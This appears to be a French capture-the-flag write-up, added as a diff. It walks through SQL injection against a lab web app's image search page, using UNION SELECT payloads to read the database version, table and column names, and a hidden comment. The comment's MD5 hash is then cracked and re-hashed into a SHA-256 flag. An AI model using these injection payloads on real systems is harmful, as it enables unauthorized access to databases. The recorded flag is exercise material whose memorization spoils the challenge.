@@ -1,0 +1,37 @@
+Page: http://192.168.56.103/?page=searchimg
+
+Nous avons un input, on tente une injection SQL:
+1 UNION SELECT 1, version()
+
+En sortie nous avons:
+
+ID: 1 UNION SELECT 1, version() 
+Title: Nsa
+Url : https://www.nsa.org/img.jpg
+ID: 1 UNION SELECT 1, version() 
+Title: 5.5.44-0ubuntu0.12.04.1
+Url : 1
+
+L'injection SQL est donc présente
+
+Pour avoir des informations supplementaires: 
+
+http://192.168.56.103/index.php?page=searchimg&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit
+1 UNION SELECT table_name, column_name FROM information_schema.columns
+
+http://192.168.56.103/?page=searchimg&id=1+UNION+SELECT+url%2C+comment+FROM+list_images&Submit=Submit#
+1 UNION SELECT url, comment FROM list_images
+
+Et nous avons:
+Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+En allant sur ce site : https://md5decrypt.net/ 
+1928e8083cf461a51303633093573c46 --> albatroz
+
+Et celui ci nous permet d'avoir le hash sha-256:
+https://emn178.github.io/online-tools/sha256.html
+
+Ou : 
+echo -n albatroz | shasum -a 256
+
+FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
